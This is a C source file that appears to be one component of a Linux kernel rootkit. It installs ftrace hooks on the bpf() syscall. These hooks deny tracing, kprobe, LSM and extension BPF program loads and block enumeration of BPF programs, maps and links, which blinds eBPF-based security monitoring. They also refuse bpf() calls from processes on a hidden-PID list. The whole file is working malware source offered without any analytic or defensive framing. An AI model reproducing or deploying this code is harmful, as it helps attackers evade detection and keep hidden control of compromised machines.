/*
Minimal experimental version / test 2
*/

#include "../include/core.h"
#include "../ftrace/ftrace_helper.h"
#include "../include/hidden_pids.h"
#include "../include/bpf_hook.h"

#define BPF_MAP_CREATE          0
#define BPF_MAP_LOOKUP_ELEM     1
#define BPF_MAP_UPDATE_ELEM     2
#define BPF_PROG_LOAD           5
#define BPF_OBJ_PIN             6
#define BPF_OBJ_GET             7
#define BPF_PROG_ATTACH         8
#define BPF_PROG_DETACH         9
#define BPF_PROG_TEST_RUN       10
#define BPF_PROG_GET_NEXT_ID    11
#define BPF_MAP_GET_NEXT_ID     12
#define BPF_PROG_GET_FD_BY_ID   13
#define BPF_MAP_GET_FD_BY_ID    14
#define BPF_OBJ_GET_INFO_BY_FD  15
#define BPF_PROG_QUERY          16
#define BPF_RAW_TRACEPOINT_OPEN 17
#define BPF_BTF_LOAD            18
#define BPF_BTF_GET_FD_BY_ID    19
#define BPF_TASK_FD_QUERY       20
#define BPF_ITER_CREATE         21
#define BPF_LINK_CREATE         28
#define BPF_LINK_UPDATE         29
#define BPF_LINK_GET_FD_BY_ID   30
#define BPF_LINK_GET_NEXT_ID    31

#define BPF_PROG_TYPE_TRACEPOINT    5
#define BPF_PROG_TYPE_KPROBE         6
#define BPF_PROG_TYPE_TRACING       26
#define BPF_PROG_TYPE_LSM           28
#define BPF_PROG_TYPE_EXT           29

static asmlinkage long (*orig_bpf)(const struct pt_regs *);
static asmlinkage long (*orig_bpf_ia32)(const struct pt_regs *);

notrace static inline bool should_hide_pid_by_int(int pid)
{
    int i;
    if (pid <= 0)
        return false;

    if (hidden_count < 0 || hidden_count > MAX_HIDDEN_PIDS)
        return false;

    for (i = 0; i < hidden_count; i++) {
        if (hidden_pids[i] == pid)
            return true;
    }
    return false;
}

notrace static bool is_dangerous_prog_type(union bpf_attr __user *uattr, unsigned int size)
{
    union bpf_attr kattr;
    size_t copy_size;

    if (!uattr || size == 0)
        return false;

    copy_size = min_t(size_t, size, sizeof(kattr));
    memset(&kattr, 0, sizeof(kattr));

    if (copy_from_user(&kattr, uattr, copy_size))
        return true;

    switch (kattr.prog_type) {
        case BPF_PROG_TYPE_TRACEPOINT:
        case BPF_PROG_TYPE_KPROBE:
        case BPF_PROG_TYPE_TRACING:
        case BPF_PROG_TYPE_LSM:
        case BPF_PROG_TYPE_EXT:
            return true;
        default:
            return false;
    }
}

notrace static bool should_block_bpf_cmd(int cmd, union bpf_attr __user *uattr, unsigned int size)
{
    pid_t pid = current->tgid;

    if (pid <= 1)
        return false;

    if (should_hide_pid_by_int(pid))
        return true;

    switch (cmd) {
        case BPF_PROG_LOAD:
            return is_dangerous_prog_type(uattr, size);

        case BPF_ITER_CREATE:
        case BPF_PROG_GET_NEXT_ID:
        case BPF_MAP_GET_NEXT_ID:
        case BPF_LINK_GET_NEXT_ID:
        case BPF_TASK_FD_QUERY:
            return true;

        case BPF_RAW_TRACEPOINT_OPEN:
        case BPF_LINK_CREATE:
        case BPF_LINK_UPDATE:
            return true;

        case BPF_PROG_QUERY:
        case BPF_OBJ_GET_INFO_BY_FD:
            return true;

        case BPF_PROG_GET_FD_BY_ID:
        case BPF_MAP_GET_FD_BY_ID:
        case BPF_BTF_GET_FD_BY_ID:
        case BPF_LINK_GET_FD_BY_ID:
            return true;

        case BPF_MAP_CREATE:
        case BPF_MAP_LOOKUP_ELEM:
        case BPF_MAP_UPDATE_ELEM:
        case BPF_OBJ_PIN:
        case BPF_OBJ_GET:
            return false;

        default:
            return true;
    }
}

notrace static asmlinkage long hook_bpf(const struct pt_regs *regs)
{
    int cmd;
    union bpf_attr __user *uattr;
    unsigned int size;

    if (!orig_bpf)
        return -ENOSYS;

    cmd = (int)regs->di;
    uattr = (union bpf_attr __user *)regs->si;
    size = (unsigned int)regs->dx;

    if (size > sizeof(union bpf_attr))
        return -EINVAL;

    if (should_block_bpf_cmd(cmd, uattr, size)) {
        return -EPERM;
    }

    return orig_bpf(regs);
}

notrace static asmlinkage long hook_bpf_ia32(const struct pt_regs *regs)
{
    int cmd;
    union bpf_attr __user *uattr;
    unsigned int size;

    if (!orig_bpf_ia32)
        return -ENOSYS;

    cmd = (int)regs->bx;
    uattr = (union bpf_attr __user *)regs->cx;
    size = (unsigned int)regs->dx;

    if (size > sizeof(union bpf_attr))
        return -EINVAL;

    if (should_block_bpf_cmd(cmd, uattr, size)) {
        return -EPERM;
    }

    return orig_bpf_ia32(regs);
}

static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_bpf", hook_bpf, &orig_bpf),
    HOOK("__ia32_sys_bpf", hook_bpf_ia32, &orig_bpf_ia32),
};

notrace int bpf_hook_init(void)
{
    int ret = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if (ret != 0)
        return ret;

    return 0;
}

notrace void bpf_hook_exit(void)
{
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}
